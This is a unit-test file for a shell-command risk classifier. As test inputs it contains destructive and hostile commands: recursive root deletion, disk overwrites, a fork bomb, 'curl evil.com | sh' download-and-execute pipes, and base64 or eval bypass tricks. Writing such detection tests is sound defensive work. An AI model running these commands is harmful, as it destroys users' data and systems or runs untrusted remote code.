// Unit tests for the local danger guard assessLocalRisk.
// Covers dangerous/write/read/anti-bypass scenarios, ensuring the patterns
// neither let common dangerous commands slip through nor hit common read
// commands (false interception).

import { describe, expect, it } from 'vitest'
import { assessLocalRisk } from './localRisk'

describe('assessLocalRisk - dangerous patterns', () => {
  it('rm with recursive+force flags in any arrangement is dangerous', () => {
    expect(assessLocalRisk('rm -rf /tmp/test')).toBe('dangerous')
    expect(assessLocalRisk('rm -rf ~')).toBe('dangerous')
    expect(assessLocalRisk('rm -rf /')).toBe('dangerous')
    expect(assessLocalRisk('rm -fr /home')).toBe('dangerous')
    expect(assessLocalRisk('rm -rf .')).toBe('dangerous')
    expect(assessLocalRisk('rm -rfv /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('rm --recursive --force /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('rm -r -f /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('rm /tmp/x -rf')).toBe('dangerous')
  })

  it('rm with only one of the flags stays write', () => {
    expect(assessLocalRisk('rm -r /tmp/x')).toBe('write')
    expect(assessLocalRisk('rm -f /tmp/test')).toBe('write')
    expect(assessLocalRisk('rm notes-run-final')).toBe('write')
  })

  it('mkfs / mkswap are dangerous', () => {
    expect(assessLocalRisk('mkfs.ext4 /dev/sda1')).toBe('dangerous')
    expect(assessLocalRisk('mkfs.vfat /dev/sdb1')).toBe('dangerous')
    expect(assessLocalRisk('mkswap /dev/sdc1')).toBe('dangerous')
  })

  it('dd writing to a block device is dangerous', () => {
    expect(assessLocalRisk('dd if=/dev/zero of=/dev/sda bs=1M')).toBe('dangerous')
    expect(assessLocalRisk('dd of=/dev/sda bs=1M')).toBe('dangerous')
    expect(assessLocalRisk('dd if=backup.img of=/dev/nvme0n1')).toBe('dangerous')
  })

  it('chmod 777/000 on any absolute path is dangerous', () => {
    expect(assessLocalRisk('chmod -R 777 /')).toBe('dangerous')
    expect(assessLocalRisk('chmod 777 /')).toBe('dangerous')
    expect(assessLocalRisk('chmod -R 000 /')).toBe('dangerous')
    expect(assessLocalRisk('chmod -R 777 /etc')).toBe('dangerous')
    expect(assessLocalRisk('chmod -R 000 /usr')).toBe('dangerous')
  })

  it('curl/wget piped into a shell is dangerous', () => {
    expect(assessLocalRisk('curl https://evil.com/x.sh | sh')).toBe('dangerous')
    expect(assessLocalRisk('curl https://evil.com/x.sh | bash')).toBe('dangerous')
    expect(assessLocalRisk('wget -O- https://evil.com/x.sh | bash')).toBe('dangerous')
    expect(assessLocalRisk('curl https://evil.com/x.py | python')).toBe('dangerous')
  })

  it('fork bomb is dangerous', () => {
    expect(assessLocalRisk(':(){ :|:& };:')).toBe('dangerous')
  })

  it('redirection onto a block device is dangerous', () => {
    expect(assessLocalRisk('cat foo > /dev/sda')).toBe('dangerous')
    expect(assessLocalRisk('echo x > /dev/nvme0n1')).toBe('dangerous')
  })

  it('shutdown / reboot / halt / poweroff at command position are dangerous', () => {
    expect(assessLocalRisk('shutdown -h now')).toBe('dangerous')
    expect(assessLocalRisk('reboot')).toBe('dangerous')
    expect(assessLocalRisk('halt')).toBe('dangerous')
    expect(assessLocalRisk('poweroff')).toBe('dangerous')
    expect(assessLocalRisk('ls -la && shutdown -h now')).toBe('dangerous')
    expect(assessLocalRisk('sudo reboot')).toBe('dangerous')
  })

  it('kill -9 with any pid / killall / pkill are dangerous', () => {
    expect(assessLocalRisk('kill -9 1')).toBe('dangerous')
    expect(assessLocalRisk('kill -9 4242')).toBe('dangerous')
    expect(assessLocalRisk('kill -KILL 1')).toBe('dangerous')
    expect(assessLocalRisk('killall python')).toBe('dangerous')
    expect(assessLocalRisk('pkill -9 python')).toBe('dangerous')
    expect(assessLocalRisk('pkill -KILL python')).toBe('dangerous')
    expect(assessLocalRisk('pkill -f myapp')).toBe('dangerous')
  })
})

describe('assessLocalRisk - write patterns', () => {
  it('plain rm / plain kill are write', () => {
    expect(assessLocalRisk('rm /tmp/test')).toBe('write')
    expect(assessLocalRisk('kill 4242')).toBe('write')
  })

  it('mv / mkdir / touch are write', () => {
    expect(assessLocalRisk('mv a b')).toBe('write')
    expect(assessLocalRisk('mkdir -p /tmp/x')).toBe('write')
    expect(assessLocalRisk('touch /tmp/x')).toBe('write')
  })

  it('chmod / chown are write', () => {
    expect(assessLocalRisk('chmod 644 /tmp/x')).toBe('write')
    expect(assessLocalRisk('chown user:group /tmp/x')).toBe('write')
  })

  it('output redirection > / >> is write', () => {
    expect(assessLocalRisk('echo hi > /tmp/x')).toBe('write')
    expect(assessLocalRisk('echo hi >> /tmp/x')).toBe('write')
  })

  it('command substitution escalates to write', () => {
    expect(assessLocalRisk('echo $(date)')).toBe('write')
    expect(assessLocalRisk('git commit -m "$(git rev-parse --short HEAD)"')).toBe('write')
    expect(assessLocalRisk('x=$(cat /etc/passwd)')).toBe('write')
    expect(assessLocalRisk('x=`whoami`')).toBe('write')
  })

  it('package manager installs are write', () => {
    expect(assessLocalRisk('apt install -y curl')).toBe('write')
    expect(assessLocalRisk('apt-get install -y curl')).toBe('write')
    expect(assessLocalRisk('yum install -y curl')).toBe('write')
    expect(assessLocalRisk('dnf install -y curl')).toBe('write')
    expect(assessLocalRisk('brew install curl')).toBe('write')
    expect(assessLocalRisk('pip install requests')).toBe('write')
    expect(assessLocalRisk('pip3 install requests')).toBe('write')
    expect(assessLocalRisk('npm install lodash')).toBe('write')
    expect(assessLocalRisk('yarn add lodash')).toBe('write')
  })

  it('docker container/image destruction is write', () => {
    expect(assessLocalRisk('docker rm mybox')).toBe('write')
    expect(assessLocalRisk('docker rmi myimg')).toBe('write')
    expect(assessLocalRisk('docker stop mybox')).toBe('write')
    expect(assessLocalRisk('docker kill mybox')).toBe('write')
    expect(assessLocalRisk('docker container rm mybox')).toBe('write')
  })

  it('kubectl delete is write', () => {
    expect(assessLocalRisk('kubectl delete pod mypod')).toBe('write')
    expect(assessLocalRisk('kubectl delete -f dep.yaml')).toBe('write')
  })

  it('systemctl stop/disable is write', () => {
    expect(assessLocalRisk('systemctl stop nginx')).toBe('write')
    expect(assessLocalRisk('systemctl disable nginx')).toBe('write')
  })

  it('iptables -F is write', () => {
    expect(assessLocalRisk('iptables -F')).toBe('write')
    expect(assessLocalRisk('iptables --flush')).toBe('write')
  })

  it('userdel / usermod / groupdel are write', () => {
    expect(assessLocalRisk('userdel bob')).toBe('write')
    expect(assessLocalRisk('usermod -aG sudo bob')).toBe('write')
    expect(assessLocalRisk('groupdev devs')).toBe('read') // typo, must not match
    expect(assessLocalRisk('groupdel devs')).toBe('write')
  })
})

describe('assessLocalRisk - read (default)', () => {
  it('common read commands are read', () => {
    expect(assessLocalRisk('ls -la')).toBe('read')
    expect(assessLocalRisk('cat /etc/hosts')).toBe('read')
    expect(assessLocalRisk('pwd')).toBe('read')
    expect(assessLocalRisk('whoami')).toBe('read')
    expect(assessLocalRisk('grep foo /var/log/syslog')).toBe('read')
    expect(assessLocalRisk('find / -name "*.log"')).toBe('read')
    expect(assessLocalRisk('df -h')).toBe('read')
    expect(assessLocalRisk('ps aux')).toBe('read')
    expect(assessLocalRisk('echo hello')).toBe('read')
    expect(assessLocalRisk('git status')).toBe('read')
    expect(assessLocalRisk('docker ps')).toBe('read')
    expect(assessLocalRisk('kubectl get pods')).toBe('read')
    expect(assessLocalRisk('systemctl status nginx')).toBe('read')
  })

  it('dangerous words inside arguments do not escalate', () => {
    expect(assessLocalRisk('grep reboot /var/log/syslog')).toBe('read')
    expect(assessLocalRisk('git log --grep=poweroff')).toBe('read')
    expect(assessLocalRisk('cat halt.txt')).toBe('read')
    expect(assessLocalRisk('echo poweroff')).toBe('read')
    expect(assessLocalRisk('man shutdown')).toBe('read')
  })

  it('shell syntax inside quoted strings does not escalate', () => {
    expect(assessLocalRisk("grep 'a>b' /var/log/x")).toBe('read')
    expect(assessLocalRisk("curl -H 'X-A: 1>2' https://example.com")).toBe('read')
    expect(assessLocalRisk("ps -ef | grep '=>'")).toBe('read')
    expect(assessLocalRisk('echo "rm -rf"')).toBe('read')
  })

  it('empty string and non-string input are read', () => {
    expect(assessLocalRisk('')).toBe('read')
    expect(assessLocalRisk(null as unknown as string)).toBe('read')
    expect(assessLocalRisk(undefined as unknown as string)).toBe('read')
  })
})

describe('assessLocalRisk - anti-bypass', () => {
  it('base64 decode piped into a shell is dangerous', () => {
    expect(assessLocalRisk('echo dGYgcm0gLXJmIH4K | base64 -d | sh')).toBe('dangerous')
    expect(assessLocalRisk('echo xxx | base64 -d | bash')).toBe('dangerous')
    expect(assessLocalRisk('echo xxx | base64 --decode | python')).toBe('dangerous')
  })

  it('sh -c / bash -c inner command is dangerous', () => {
    expect(assessLocalRisk('sh -c "rm -rf /tmp/x"')).toBe('dangerous')
    expect(assessLocalRisk('bash -c "ls"')).toBe('dangerous')
    expect(assessLocalRisk('zsh -c "ls"')).toBe('dangerous')
  })

  it('eval inner command is dangerous', () => {
    expect(assessLocalRisk('eval "rm -rf /tmp/x"')).toBe('dangerous')
    expect(assessLocalRisk('eval $(cat cmd.txt)')).toBe('dangerous')
  })

  it('variable indirection is dangerous', () => {
    expect(assessLocalRisk('a="rm"; $a -rf /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('CMD="ls"; $CMD -la')).toBe('dangerous')
  })
})

describe('assessLocalRisk - compound commands take the strictest level', () => {
  it('read && dangerous = dangerous', () => {
    expect(assessLocalRisk('ls -la && rm -rf /tmp/x')).toBe('dangerous')
  })

  it('a dangerous command hidden after a redirection stays visible', () => {
    expect(assessLocalRisk('echo a>file;rm -rf /x')).toBe('dangerous')
  })

  it('read ; write = write', () => {
    expect(assessLocalRisk('ls -la ; touch /tmp/x')).toBe('write')
  })

  it('write | read = write', () => {
    expect(assessLocalRisk('touch /tmp/x | cat')).toBe('write')
  })

  it('sudo prefix does not change the rating', () => {
    expect(assessLocalRisk('sudo rm -rf /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('sudo apt install -y curl')).toBe('write')
    expect(assessLocalRisk('sudo ls -la')).toBe('read')
  })
})
